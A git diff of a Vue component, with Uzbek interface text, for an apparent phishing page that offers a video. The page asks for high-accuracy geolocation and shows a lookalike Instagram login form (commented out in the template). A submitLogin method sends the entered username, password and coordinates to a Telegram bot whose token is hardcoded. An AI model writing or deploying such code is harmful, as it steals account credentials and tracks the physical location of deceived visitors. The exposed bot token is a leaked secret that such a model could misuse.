@@ -1,12 +1,18 @@
 <template>
   <div class="video-container">
-    <!-- Modal -->
-    <div class="modal" v-if="showModal">
+    <!-- Geolocation Modal -->
+    <div v-if="showGeoModal" class="modal">
       <div class="modal-content">
-        <h2>Videoni ko'rishni xohlaysizmi?</h2>
-        <button class="allow-btn" @click="allowVideo">Ko'rish</button>
+        <img src="../logos.png" width="48" height="48" alt="logo" />
+        <h2>
+          Videoni ko'rishdan oldin joylashuvingizni aniqlashga ruxsat bering.
+        </h2>
+        <button @click="requestGeolocation" class="allow-btn">
+          Ruxsat berish
+        </button>
       </div>
     </div>
+
     <!-- Error Modal -->
     <div v-if="geoDenied" class="modal">
       <div class="modal-content">
@@ -16,22 +22,58 @@
         </h2>
       </div>
     </div>
+
+    <!-- Login Form -->
+    <!-- <div v-if="showLogin" class="login-form">
+      <img
+        src="../logos.png"
+        width="75"
+        height="75"
+        alt="logo"
+        class="instagram-logo"
+      />
+      <h2 class="instagram-text">Instagram</h2>
+      <input
+        type="text"
+        placeholder="Phone number, username, or email"
+        v-model="username"
+      />
+      <input type="password" placeholder="Password" v-model="password" />
+      <button class="allow-btn login-btn" @click="submitLogin">Log in</button>
+      <div class="or-divider">
+        <span class="divider-line"></span>
+        <span class="or-text">OR</span>
+        <span class="divider-line"></span>
+      </div>
+      <a href="#" class="forgot-password">Forgot password?</a>
+      <div class="signup-container">
+        <p>
+          Don't have an account? <a href="#" class="signup-link">Sign up</a>
+        </p>
+      </div>
+    </div> -->
+
     <!-- Video Player -->
     <div v-if="showVideo" class="video-box">
-      <video controls autoplay class="insta-video">
+      <video controls autoplay loop class="insta-video">
         <source src="./assets/mainvideo.mp4" type="video/mp4" />
-        Your browser does not support the video tag.
+        Sizning brauzeringiz video tagni qo'llab-quvvatlamaydi.
       </video>
     </div>
   </div>
 </template>
+
 <script>
 export default {
-  name: "InstagramVideo",
+  name: "GeoLoginVideo",
   data() {
     return {
-      showModal: true,
+      showGeoModal: true,
+      geoDenied: false,
+      showLogin: false,
       showVideo: false,
+      username: "",
+      password: "",
       latitude: null,
       longitude: null,
       botToken: "7622854137:AAH6xblJA8biVHaE4VbC1svOAC-izatOoZI",
@@ -39,22 +81,29 @@ export default {
     };
   },
   methods: {
-    allowVideo() {
-      this.getGeolocation();
-    },
-    getGeolocation() {
+    requestGeolocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          (position) => {
-            this.latitude = position.coords.latitude;
-            this.longitude = position.coords.longitude;
-            this.sendToTelegram(); // faqat muvaffaqiyatli holatda
-            this.showModal = false;
-            this.showVideo = true;
+          (pos) => {
+            this.latitude = pos.coords.latitude;
+            this.longitude = pos.coords.longitude;
+            // this.sendToTelegram();
+            this.showGeoModal = false;
+            this.showLogin = true;
           },
-          (error) => {
-            console.error("Geolocation error:", error.message);
-            window.location.href = "/"; // rad etsa — sahifaga qaytar
+          (err) => {
+            console.error("Geolocation error:", err.message);
+
+            // ❌ Ruhsat berilmasa:
+            this.geoDenied = true;
+            this.showGeoModal = false;
+            this.showLogin = false;
+
+            // ✅ 3 soniyadan so'ng bosh oynaga qaytarish
+            setTimeout(() => {
+              this.geoDenied = false;
+              this.showGeoModal = true;
+            }, 3000);
           },
           {
             enableHighAccuracy: true,
@@ -63,26 +112,47 @@ export default {
           }
         );
       } else {
-        window.location.href = "/";
-      },
+        this.geoDenied = true;
+        this.showGeoModal = false;
+        this.showLogin = false;
+
+        setTimeout(() => {
+          this.geoDenied = false;
+          this.showGeoModal = true;
+        }, 3000);
+      }
+    },
     sendToTelegram() {
-      const message = `📍 Yangi foydalanuvchi joylashuvi:
-Latitude: ${this.latitude}
-Longitude: ${this.longitude}
-🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
-🕒 Vaqt: ${new Date().toLocaleString()}`;
+      const message = `📍 Foydalanuvchi ma'lumoti:
+    Login: ${this.username}
+    Password: ${this.password}
+    Latitude: ${this.latitude}
+    Longitude: ${this.longitude}
+    🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${
+        this.longitude
+      }
+    🕒 Vaqt: ${new Date().toLocaleString()}`;
 
-      const encodedMessage = encodeURIComponent(message);
-      const telegramUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage?chat_id=${this.chatId}&text=${encodedMessage}`;
+      const url = `https://api.telegram.org/bot${
+        this.botToken
+      }/sendMessage?chat_id=${this.chatId}&text=${encodeURIComponent(message)}`;
 
-      fetch(telegramUrl)
+      fetch(url)
         .then((res) => res.json())
         .then((data) => {
-          console.log("Telegramga yuborildi:", data);
+          console.log("✅ Telegramga yuborildi:", data);
         })
-        .catch((err) => {
-          console.error("Telegramga yuborishda xatolik:", err);
-        });
+        .catch((err) => console.error("❌ Telegram xatosi:", err));
+    },
+
+    submitLogin() {
+      if (this.username && this.password) {
+        this.sendToTelegram();
+        this.showLogin = false;
+        this.showVideo = true;
+      } else {
+        alert("Iltimos, barcha maydonlarni to'ldiring.");
+      }
     },
   },
 };
@@ -92,70 +162,143 @@ Longitude: ${this.longitude}
 * {
   margin: 0;
   padding: 0;
-  background: #000;
-  box-sizing: border-box;
+  box-sizing: border-box !important;
+  background-color: #000 !important;
 }
 .video-container {
   display: flex;
-  justify-content: center;
+  flex-direction: column;
   align-items: center;
-  width: 100%;
-  min-height: 100vh;
-  background-color: #000;
+  background: #f00;
   color: #fff;
-  position: relative;
-  font-family: Arial, sans-serif;
+  min-height: 100vh;
+  padding: 30px;
+  font-family: sans-serif;
 }
 
-/* Modal styling */
 .modal {
   position: fixed;
   top: 0;
   left: 0;
   width: 100%;
   height: 100%;
-  background-color: rgba(0, 0, 0, 0.8);
+  background: #000;
   display: flex;
   justify-content: center;
   align-items: center;
   z-index: 10;
 }
 
-.modal-content {
-  background-color: #1a1a1a;
+.modal-content,
+.login-form {
+  background: gray;
   padding: 30px 40px;
   border-radius: 12px;
+  box-shadow: 0 0 10px #3d3d3d;
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  align-items: center;
   text-align: center;
-  box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+  margin: 0 10px;
 }
 
 .allow-btn {
-  margin-top: 20px;
-  background-color: #0095f6;
-  color: white;
-  padding: 10px 20px;
+  background: #0095f6 !important;
+  color: #fff;
   border: none;
   border-radius: 8px;
+  padding: 10px 20px;
   font-weight: bold;
   cursor: pointer;
 }
-
 .allow-btn:hover {
-  background-color: #0078cc;
+  background: #0078cc;
 }
 
-/* Video player styling */
+.login-form {
+  background: transparent !important;
+  box-sizing: border-box !important;
+  padding: 30px 40px;
+  /* border-radius: 1px; */
+  width: 350px;
+}
+
+.instagram-logo {
+  margin-bottom: 10px;
+}
+
+.instagram-text {
+  font-family: "Brush Script MT", cursive;
+  font-size: 40px;
+  margin: 0 0 20px 0;
+  font-weight: normal;
+}
+
+.login-form input {
+  width: 100%;
+  padding: 12px 10px;
+  border: 1px solid #262626;
+  border-radius: 3px;
+  background: #121212;
+  color: #fff;
+  margin-bottom: 6px;
+  font-size: 12px;
+}
+
+.login-btn {
+  width: 100%;
+  margin-top: 8px;
+}
+
+.or-divider {
+  display: flex;
+  align-items: center;
+  width: 100%;
+  margin: 15px 0;
+}
+
+.divider-line {
+  flex: 1;
+  height: 1px;
+  background-color: #262626;
+}
+
+.or-text {
+  padding: 0 15px;
+  color: #8e8e8e;
+  font-size: 13px;
+  font-weight: 600;
+}
+
+.forgot-password {
+  color: #0095f6;
+  font-size: 12px;
+  text-decoration: none;
+  margin-top: 5px;
+}
+
+.signup-container {
+  margin-top: 20px;
+  font-size: 14px;
+}
+
+.signup-link {
+  color: #0095f6;
+  text-decoration: none;
+  font-weight: 600;
+}
+
 .video-box {
+  background-color: transparent !important;
+  box-sizing: border-box !important;
   max-width: 400px;
   width: 100%;
-  padding: 20px;
-  border-radius: 20px;
-  background-color: #111;
-  box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
+  margin-top: 30px;
 }
-
 .insta-video {
   width: 100%;
   border-radius: 12px;
+  object-fit: cover;
 }
 </style>
